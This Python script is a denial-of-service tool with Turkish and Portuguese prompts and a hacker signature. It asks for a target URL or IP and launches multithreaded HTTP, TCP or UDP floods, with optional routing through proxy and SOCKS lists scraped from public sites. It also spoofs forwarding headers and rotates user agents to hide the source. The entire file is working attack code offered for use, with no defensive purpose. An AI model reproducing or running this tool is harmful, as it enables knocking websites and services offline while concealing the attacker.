import socket
import socks
import threading
import random
import re
import urllib.request
import os
import sys
def temizle_konsol():
    if os.name == 'nt':  # Windows
        os.system('cls')
    else:  # Mac ve Linux
        os.system('clear')
temizle_konsol()        
from bs4 import BeautifulSoup

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # C0d3d by İLLEGALSEMENOV I AM FMY

if sys.platform.startswith("linux"): # C0d3d by İLLEGALSEMENOV I AM FMY
	from scapy.all import * # C0d3d by İLLEGALSEMENOV I AM FMY
elif sys.platform.startswith("freebsd"): # C0d3d by İLLEGALSEMENOV I AM FMY
	from scapy.all import * # C0d3d by İLLEGALSEMENOV I AM FMY
else: # C0d3d by İLLEGALSEMENOV I AM FMY
	print ("TCP/UDP FLOOD BU SİSTEM ALTINDA DESTEKLENMEMEKTEDİR. HTTP FLOOD KULLANMALISINIZ.") # C0d3d by İLLEGALSEMENOV I AM FMY

print('''

                                    ███████████████████████████████████████████████████████████████████████████████
                                    ████████████████████████████████████████████████████████████████████████████████
                                    ████████████████████████████████████████████████████████████████████████████████
                                    ██████████████████████████████████▀▀▀▓████▓▒░███████████████████████████████████
                                    ████████████████████░,▒▓██▓░▐█████ ╓╬██████▓╜▐██████░▒▓██▓░.███████████▀████████
                                    ████████▌╠███▓▐█████░▐█████▒▐█████▌┌╠███▀▒██▒╜██████▒▓████▓,▐█████▒███▓\████████
                                    █████████╢▀╟▓▓▓█████▄▒▓─▌▀▓▌▐██████░╫██▌`█░╩▒«██████╢▓█░W╢▒░▐█████▓█▒░╣░████████
                                    █████████▌▒█▓▓███████▒%▓█▓D▒████████▀█▓▓██▓H╒▐███████╣╬██N░y███████▓█▌░█████████
                                    ██████████▐█▌▄███████▌╢▒█▒▄▐█████████░▀╣██▌ ░████████▀▓▓█╓H████████▒█▌,█████████
                                    ██████████████████████ ▐█▒╓██████████▄╙▓▓██' █████████░██ ▄█████████████████████
                                    ██████████████████████▓███████████████▌▄██░,████████████████████████████████████
                                    ███████████████████████████████████████▓▓▌▒@████████████████████████████████████
                                    █████████████████████████████████████▓╫▓███@████████████████████████████████████
                                    ████████████████████████████████████▀▒▓███▓█████████████████████████████████████
                                    ████████████████████████████████████▄███▓▓██████████████████████████████████████
                                    ███████████████████████████████████████▓████████████████████████████████████████
                                    ████████████████████████████████████████████████████████████████████████████████
                                    ████████████████████████████████████████████████████████████████████████████████
                                    ████████████████████████████████████████████████████████████████████████████████
                                    ████████████████████████████████████████████████████████████████████████████████
                                                             
                                                                
           
	''') # her nefis bir gün DDoS'u tadacaktır

useragents = [
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
    "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
    "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
    "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1"
]


def starturl(): # C0d3d by İLLEGALSEMENOV I AM FMY
	global url
	global url2
	global urlport

	url = input("\nInsert URL/IP: ").strip()

	if url == "":
		print ("Por favor insira o url.")
		starturl()

	try:
		if url[0]+url[1]+url[2]+url[3] == "www.":
			url = "http://" + url
		elif url[0]+url[1]+url[2]+url[3] == "http":
			pass
		else:
			url = "http://" + url
	except:
		print("You mistyped, try again.")
		starturl()

	try:
		url2 = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
	except:
		url2 = url.replace("http://", "").replace("https://", "").split("/")[0]

	try:
		urlport = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]
	except:
		urlport = "80"

	floodmode()

def floodmode():
	global choice1
	choice1 = input("Bir HTTP '0' (daha iyi), bir TCP '1' veya bir UDP '2'yi çalıştırmak mı istiyorsunuz?")
	if choice1 == "0":
		proxymode()
	elif choice1 == "1":
		try:
			if os.getuid() != 0: # C0d3d by İLLEGALSEMENOV I AM FMY
				print("TCP / UDP'yi kullanmak için bu programı tam olarak root olarak çalıştırabilirsiniz.") # C0d3d by İLLEGALSEMENOV I AM FMY
				exit(0) # C0d3d by İLLEGALSEMENOV I AM FMY
			else: # C0d3d by İLLEGALSEMENOV I AM FMY
				floodport() # C0d3d by İLLEGALSEMENOV I AM FMY
		except:
			pass
	elif choice1 == "2":
		try:
			if os.getuid() != 0: # C0d3d İLLEGALSEMENOV I AM FMY
				print("TCP / UDP'yi kullanmak için bu programı tam olarak root olarak çalıştırabilirsiniz.") # C0d3d by İLLEGALSEMENOV I AM FMY
				exit(0) # C0d3d by İLLEGALSEMENOV I AM FMY
			else: # 
				floodport() # C0d3d by İLLEGALSEMENOV I AM FMY
		except:
			pass
	else:
		print ("Tekrar Dene.")
		floodmode()

def floodport():
	global port
	try:
		port = int(input("Port Giriniz "))
		portlist = range(65535) # C0d3d by İLLEGALSEMENOV I AM FMY
		if port in portlist: # C0d3d by İLLEGALSEMENOV I AM FMY
			pass # C0d3d by İLLEGALSEMENOV I AM FMY
		else: # C0d3d by İLLEGALSEMENOV I AM FMY
			print ("Você digitou incorretamente, tente novamente.")
			floodport() # C0d3d by İLLEGALSEMENOV I AM FMY
	except ValueError: # C0d3d by İLLEGALSEMENOV I AM FMY
		print ("Yanlış Girdin Tekrar Dene") # C0d3d by İLLEGALSEMENOV I AM FMY
		floodport() # C0d3d by İLLEGALSEMENOV I AM FMY
	proxymode()

def proxymode():
	global choice2
	choice2 = input("Proxy/socks modunu istiyor musunuz? Etkinleştirmek için 'y' cevabını verin: ")
	if choice2 == "y":
		choiceproxysocks()
	else:
		numthreads()

def choiceproxysocks():
	global choice3
	choice3 = input("Proxy modunu etkinleştirmek için '0' girin veya socks modunu etkinleştirmek için '1' girin: ")
	if choice3 == "0":
		choicedownproxy()
	elif choice3 == "1":
		choicedownsocks()
	else:
		print ("try again.")
		choiceproxysocks()

def choicedownproxy():
	choice4 = input("Yeni bir proxy listesi indirmek istiyor musunuz? Bunu yapmak için 'y' cevabını verin: ")
	if choice4 == "y":
		choicemirror1()
	else:
		proxylist()

def choicedownsocks():
	choice4 = input("Yeni bir socks listesi indirmek ister misiniz? Bunu yapmak için 'y' cevabını verin: ")
	if choice4 == "y":
		choicemirror2()
	else:
		proxylist()

def choicemirror1():
	global urlproxy
	choice5 = input ("Baixe em: free-proxy-list.net = '0' (melhor) ou inforge.net = '1'")
	if choice5 == "0":
		urlproxy = "http://free-proxy-list.net/"
		proxyget1()
	elif choice5 == "1":
		inforgeget()
	else:
		print(" try again.")
		choicemirror1()

def choicemirror2():
	global urlproxy
	choice5 = input ("Baixe em: free-proxy-list.net = '0' (melhor) ou inforge.net = '1'")
	if choice5 == "0":
		urlproxy = "https://www.socks-proxy.net/"
		proxyget1()
	elif choice5 == "1":
		inforgeget()
	else:
		print("Yanlış girdiniz, lütfen tekrar deneyin.")
		choicemirror2()

def proxyget1(): # C0d3d by İLLEGALSEMENOV I AM FMY
	try:
		req = urllib.request.Request(("%s") % (urlproxy))       
		req.add_header("Agente de usuário", random.choice(useragents)) 
		sourcecode = urllib.request.urlopen(req)                
		part = str(sourcecode.read())                           
		part = part.split("<tbody>")
		part = part[1].split("</tbody>")
		part = part[0].split("<tr><td>")
		proxies = ""
		for proxy in part:
			proxy = proxy.split("</td><td>")
			try:
				proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
			except:
				pass
		out_file = open("proxy.txt","w")
		out_file.write("")
		out_file.write(proxies)
		out_file.close()
		print ("Proxies baixados com sucesso.")
	except: 
		print ("\nERROR!\n")
	proxylist() 

def inforgeget(): 
	try:
		if os.path.isfile("proxy.txt"):
			out_file = open("proxy.txt","w") 
			out_file.write("")               
			out_file.close()
		else:
			pass
		url = "https://www.inforge.net/xi/forums/liste-proxy.1118/"
		soup = BeautifulSoup(urllib.request.urlopen(url)) 
		print ("\nBaixando de inforge.net em andamento...")
		base = "https://www.inforge.net/xi/"                       
		for tag in soup.find_all("a", {"class":"PreviewTooltip"}): 
			links = tag.get("href")                                
			final = base + links                                   
			result = urllib.request.urlopen(final)                 
			for line in result :
				ip = re.findall("(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})", str(line)) 
				if ip: 
					for x in ip:
						out_file = open("proxy.txt","a") 
						while True:
							out_file.write(x+"\n")
							out_file.close()
							break 
		print ("Proxies baixados com sucesso.") 
	except: 
		print ("\nERROR!\n") 
	proxylist() 

def proxylist():
	global proxies
	out_file = str(input("Digite o nome de arquivo / caminho da lista de proxylist (proxy.txt): "))
	if out_file == "":
		out_file = "proxy.txt"
	proxies = open(out_file).readlines()
	numthreads()

def numthreads():
	global threads
	try:
		threads = int(input("Insira o número de fios (800): "))
	except ValueError:
		threads = 800
		print ("800 threads selected.\n")
	multiplication()

def multiplication():
	global multiple
	try:
		multiple = int(input("bak ben olsam 1000 yaparım [(1-5 = normal) (50 = poderoso) (100 ou mais = bomba)]: "))
	except ValueError:
		print("Yanlış Girdin Tekrar Dene.\n")
		multiplication()
	begin()

def begin():
	choice6 = input("Çalıştırmak İçin ENTER tunuşa boşalın ")
	if choice6 == "":
		loop()
	elif choice6 == "Enter": #loL31
		loop()
	elif choice6 == "enter": #loL31
		loop()
	else:
		exit(0)

def loop():
	global threads
	global get_host
	global acceptall
	global connection
	global go
	global x
	if choice1 == "0": 
		get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
		acceptall = ["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", "Accept-Encoding: gzip, deflate\r\n", "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"]
		connection = "Connection: Keep-Alive\r\n" 
	x = 0 
	go = threading.Event()
	if choice1 == "1": 
		if choice2 == "y": 
			if choice3 == "0": 
				for x in range(threads):
					tcpfloodproxed(x+1).start() 
					print ("Thread " + str(x) + " ready!")
				go.set() 
			else: 
				for x in range(threads):
					tcpfloodsocked(x+1).start() 
					print ("Thread " + str(x) + " ready!")
				go.set() 
		else: 
			for x in range(threads):
				tcpflood(x+1).start() 
				print ("Thread " + str(x) + " ready!")
			go.set() 
	else: 
		if choice1 == "2": 
			if choice2 == "y": 
				if choice3 == "0": 
					for x in range(threads):
						udpfloodproxed(x+1).start() 
						print ("Thread " + str(x) + " ready!")
					go.set() 
				else: 
					for x in range(threads):
						udpfloodsocked(x+1).start() 
						print ("Thread " + str(x) + " ready!")
					go.set() 
			else: 
				for x in range(threads):
					udpflood(x+1).start() 
					print ("Thread " + str(x) + " ready!")
				go.set() 
		else: 
			if choice2 == "y": 
				if choice3 == "0": 
					for x in range(threads):
						requestproxy(x+1).start() 
						print ("Thread " + str(x) + " ready!")
					go.set() 
				else: 
					for x in range(threads):
						requestsocks(x+1).start() 
						print ("Thread " + str(x) + " ready!")
					go.set() 
			else: 
				for x in range(threads):
					requestdefault(x+1).start() 
					print ("Thread " + str(x) + " ready!")
				go.set() 

class tcpfloodproxed(threading.Thread): 

	def __init__(self, counter): 
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): 
		data = random._urandom(100240) 
		p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data) 
		current = x 
		if current < len(proxies): 
			proxy = proxies[current].strip().split(':')
		else: 
			proxy = random.choice(proxies).strip().split(":")
		go.wait() 
		while True:
			try:
				socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True) 
				s = socks.socksocket() 
				s.connect((str(url2),int(port))) 
				s.send(p) 
				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
				try: 
					for y in range(multiple): 
						s.send(str.encode(p)) 
				except: 
					s.close()
			except: 
				s.close() 

class tcpfloodsocked(threading.Thread): 

	def __init__(self, counter): 
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): 
		data = random._urandom(1024) 
		p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data) 
		current = x 
		if current < len(proxies): 
			proxy = proxies[current].strip().split(':')
		else: 
			proxy = random.choice(proxies).strip().split(":")
		go.wait() 
		while True:
			try:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) 
				s = socks.socksocket() 
				s.connect((str(url2),int(port))) 
				s.send(p) 
				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
				try: 
					for y in range(multiple): 
						s.send(str.encode(p)) 
				except: 
					s.close()
			except: 
				s.close() 
				try:
					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) 
					s = socks.socksocket() 
					s.connect((str(url2),int(port))) 
					s.send(p) 
					print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
					try: 
						for y in range(multiple): 
							s.send(str.encode(p)) 
					except: 
						s.close()
				except: 
					print ("Sock down. Retrying request. @", self.counter)
					s.close() 

class tcpflood(threading.Thread): 

	def __init__(self, counter):
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): 
		data = random._urandom(1024) 
		p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data) 
		go.wait() 
		while True: 
			try: 
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
				s.connect((str(url2),int(port))) 
				s.send(p) 
				print ("Request Sent! @", self.counter) 
				try: 
					for y in range(multiple): 
						s.send(str.encode(p)) 
				except: 
					s.close()
			except: 
				s.close() 

class udpfloodproxed(threading.Thread): 

	def __init__(self, counter): 
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): 
		data = random._urandom(1024) 
		p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data) 
		current = x 
		if current < len(proxies): 
			proxy = proxies[current].strip().split(':')
		else: 
			proxy = random.choice(proxies).strip().split(":")
		go.wait() 
		while True:
			try:
				socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True) 
				s = socks.socksocket() 
				s.connect((str(url2),int(port))) 
				s.send(p) 
				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
				try: 
					for y in range(multiple): 
						s.send(str.encode(p)) 
				except: 
					s.close()
			except: 
				s.close() 

class udpfloodsocked(threading.Thread): 

	def __init__(self, counter): 
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): 
		data = random._urandom(1024) 
		p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data) 
		current = x 
		if current < len(proxies): 
			proxy = proxies[current].strip().split(':')
		else: 
			proxy = random.choice(proxies).strip().split(":")
		go.wait() 
		while True:
			try:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) 
				s = socks.socksocket() 
				s.connect((str(url2),int(port))) 
				s.send(p) 
				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
				try: 
					for y in range(multiple): 
						s.send(str.encode(p)) 
				except: 
					s.close()
			except: 
				s.close() 
				try:
					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) 
					s = socks.socksocket() 
					s.connect((str(url2),int(port))) 
					s.send(p) 
					print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
					try: 
						for y in range(multiple): 
							s.send(str.encode(p)) 
					except: 
						s.close()
				except: 
					print ("Sock down. Retrying request. @", self.counter)
					s.close() 

class udpflood(threading.Thread): 

	def __init__(self, counter): 
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): 
		data = random._urandom(1024) 
		p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data) 
		go.wait() 
		while True: 
			try: 
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
				s.connect((str(url2),int(port))) 
				s.send(p) 
				print ("Request Sent! @", self.counter) 
				try: 
					for y in range(multiple): 
						s.send(str.encode(p)) 
				except: 
					s.close()
			except: 
				s.close() 

class requestproxy(threading.Thread): 

	def __init__(self, counter): 
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): 
		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" 
		accept = random.choice(acceptall) 
		randomip = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
		forward = "X-Forwarded-For: " + randomip + "\r\n" 
		request = get_host + useragent + accept + forward + connection + "\r\n" 
		current = x 
		if current < len(proxies): 
			proxy = proxies[current].strip().split(':')
		else: 
			proxy = random.choice(proxies).strip().split(":")
		go.wait() 
		while True: 
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
				s.connect((str(proxy[0]), int(proxy[1]))) 
				s.send(str.encode(request)) 
				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
				try: 
					for y in range(multiple): 
						s.send(str.encode(request)) 
				except: 
					s.close()
			except:
				s.close() 

class requestsocks(threading.Thread): 

	def __init__(self, counter): 
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): 
		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" 
		accept = random.choice(acceptall) 
		request = get_host + useragent + accept + connection + "\r\n" 
		current = x 
		if current < len(proxies): 
			proxy = proxies[current].strip().split(':')
		else: 
			proxy = random.choice(proxies).strip().split(":")
		go.wait() 
		while True:
			try:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) 
				s = socks.socksocket() 
				s.connect((str(url2), int(urlport))) 
				s.send (str.encode(request)) 
				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
				try: 
					for y in range(multiple): 
						s.send(str.encode(request)) 
				except: 
					s.close()
			except: 
				s.close() 
				try: 
					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) 
					s = socks.socksocket() 
					s.connect((str(url2), int(urlport))) 
					s.send (str.encode(request)) 
					print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
					try: 
						for y in range(multiple): 
							s.send(str.encode(request)) 
					except: 
						s.close()
				except:
					print ("Sock down. Retrying request. @", self.counter)
					s.close() 

class requestdefault(threading.Thread): 

	def __init__(self, counter): 
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): 
		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" 
		accept = random.choice(acceptall) 
		request = get_host + useragent + accept + connection + "\r\n" 
		go.wait() 
		while True:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
				s.connect((str(url2), int(urlport))) 
				s.send (str.encode(request)) 
				print ("Request sent! @", self.counter) 
				try: 
					for y in range(multiple): 
						s.send(str.encode(request)) 
				except: 
					s.close()
			except: 
				s.close() 

starturl() 
#gidersin elinde valiz gelirsin evinde haciz
#AOSMTAL